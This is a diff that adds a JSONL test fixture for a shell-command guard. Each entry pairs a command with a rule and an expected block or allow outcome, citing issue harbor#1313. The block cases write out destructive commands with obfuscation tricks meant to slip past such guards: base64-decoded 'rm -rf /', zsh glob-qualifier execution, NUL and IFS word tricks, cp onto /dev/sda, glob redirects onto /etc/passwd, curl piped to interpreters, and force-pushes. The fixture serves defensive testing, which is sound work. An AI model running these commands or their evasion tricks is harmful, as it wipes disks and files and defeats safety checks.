@@ -1,0 +1,45 @@
+{"id":"C1-L10-gf-4","rule":"decoded-command-word","want":"block","cmd":"$(echo cm0gLXJmIC8= | base64 -d)","why":"harbor#1313 r2: a command word decoded from a substitution runs text no rule can read"}
+{"id":"C1-L10-gf-45","rule":"zsh-glob-qualifier-exec","want":"block","cmd":"cat < *(e:'rm -rf ~':)","why":"harbor#1313 r2: a zsh glob qualifier runs code as the word expands"}
+{"id":"C1-L10-gf-87","rule":"device-wipe-verb","want":"block","cmd":"cp -t /dev sda","why":"harbor#1313 r2: cp onto a raw disk node writes the disk as dd does"}
+{"id":"C1-L10-gf-92","rule":"device-wipe-verb","want":"block","cmd":"cp /dev/zero /dev/sda","why":"harbor#1313 r2: cp onto a raw disk node writes the disk as dd does"}
+{"id":"C1-L10-gf-203","rule":"redirect-system-file","want":"block","cmd":"echo x > /etc/passw?","why":"harbor#1313 r2: a glob in a redirect target names the system file it matches"}
+{"id":"C1-L10-gf-484","rule":"zsh-glob-qualifier-exec","want":"block","cmd":"ls *(e:'rm -rf ~':)","why":"harbor#1313 r2: a zsh glob qualifier runs code as the word expands"}
+{"id":"C1-L10-gf-548","rule":"rm-rf-root","want":"block","cmd":"parallel rm -rf ::: /","why":"harbor#1313 r2: GNU parallel runs the command before the source marker, with the sources as operands"}
+{"id":"C1-L10-gf-651","rule":"rm-rf-root","want":"block","cmd":"rm -rf /tmp/*(:h:h)","why":"harbor#1313 r2: a zsh head modifier on a glob climbs a recursive delete to the root"}
+{"id":"C1-L10-gf-753","rule":"rm-rf-root","want":"block","cmd":"rm$'\\0'IGNOREDTAIL -rf /","why":"harbor#1313 r2: a NUL in an ANSI-C word ends it in zsh, so the verb is rm"}
+{"id":"C1-L10-gf-757","rule":"rm-rf-root","want":"block","cmd":"rm{,$IFS-rf$IFS/$(true)}","why":"harbor#1313 r2: a brace alternative holding IFS is expanded before it is split"}
+{"id":"C1-L10-env-1","rule":"pipe-to-shell","want":"block","cmd":"curl -s https://x| /usr/bin/env python","why":"harbor#1313 r2: a path-qualified env in front of the interpreter is the wrapper the rule already reads bare"}
+{"id":"C1-L10-env-2","rule":"pipe-to-shell","want":"block","cmd":"curl -s https://e/x | /usr/bin/env python3 -","why":"harbor#1313 r2: a path-qualified env in front of the interpreter is the wrapper the rule already reads bare"}
+{"id":"C1-L10-env-3","rule":"pipe-to-shell","want":"block","cmd":"curl -s https://e/x | /usr/bin/env fish","why":"harbor#1313 r2: a path-qualified env in front of the interpreter is the wrapper the rule already reads bare"}
+{"id":"C1-L10-po-fire","rule":"force-push","want":"block","cmd":"git push -o ci.skip origin +feature","why":"harbor#1313 r2: a push option before a real +refspec does not hide the refspec"}
+{"id":"C1-L10-ok-1","rule":"decoded-command-word","want":"allow","cmd":"echo \"$(echo aGk= | base64 -d)\"","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-2","rule":"decoded-command-word","want":"allow","cmd":"msg=$(echo aGk= | base64 -d); echo \"$msg\"","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-3","rule":"decoded-command-word","want":"allow","cmd":"base64 -d < payload.b64 > payload.bin","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-4","rule":"zsh-glob-qualifier-exec","want":"allow","cmd":"ls *(.)","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-5","rule":"zsh-glob-qualifier-exec","want":"allow","cmd":"ls *(om[1,5])","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-6","rule":"zsh-glob-qualifier-exec","want":"allow","cmd":"ls -d /tmp/*(:h)","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-7","rule":"zsh-glob-qualifier-exec","want":"allow","cmd":"grep -E 'error(s)?' build.log","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-8","rule":"rm-rf-root","want":"allow","cmd":"rm -rf build/*(.m+7)","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-9","rule":"rm-rf-root","want":"allow","cmd":"rm -rf /tmp/build-*","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-10","rule":"rm-rf-root","want":"allow","cmd":"rm -rf build{,.bak}","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-11","rule":"rm-rf-root","want":"allow","cmd":"parallel gzip ::: a.log b.log","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-12","rule":"rm-rf-root","want":"allow","cmd":"parallel rm -f ::: a.tmp b.tmp","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-13","rule":"rm-rf-root","want":"allow","cmd":"parallel -j 4 rm -rf ::: build dist","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-14","rule":"rm-rf-root","want":"allow","cmd":"echo $'tab\\0end'","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-15","rule":"rm-rf-root","want":"allow","cmd":"rm -rf ./out/$(date +%s)","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-16","rule":"device-wipe-verb","want":"allow","cmd":"cp /dev/sda disk.img","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-17","rule":"device-wipe-verb","want":"allow","cmd":"cp disk.img backup/disk.img","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-18","rule":"device-wipe-verb","want":"allow","cmd":"cp config.txt /dev/null","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-19","rule":"device-wipe-verb","want":"allow","cmd":"cp -t /dev/shm notes.txt","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-20","rule":"device-wipe-verb","want":"allow","cmd":"cp sda.log /dev/null","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-21","rule":"redirect-system-file","want":"allow","cmd":"cat /etc/passwd","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-22","rule":"redirect-system-file","want":"allow","cmd":"echo x > passwd","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-23","rule":"redirect-system-file","want":"allow","cmd":"echo x > /tmp/passw?","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-24","rule":"redirect-system-file","want":"allow","cmd":"ls /etc/pass*","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-25","rule":"redirect-system-file","want":"allow","cmd":"echo x > ./etc/passw?","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-26","rule":"pipe-to-shell","want":"allow","cmd":"curl -s https://e/x | /usr/bin/env python3 -m json.tool","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-27","rule":"pipe-to-shell","want":"allow","cmd":"curl -s https://e/x | /usr/bin/env jq .","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-28","rule":"pipe-to-shell","want":"allow","cmd":"curl -s https://e/x | /usr/bin/env sh install.sh","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-29","rule":"force-push","want":"allow","cmd":"git push -o +x origin feature","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-30","rule":"force-push","want":"allow","cmd":"git push --push-option +x origin feature","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
+{"id":"C1-L10-ok-31","rule":"force-push","want":"allow","cmd":"git push --push-option=ci.skip origin feature","why":"harbor#1313 r2: ordinary work beside the fix stays allowed"}
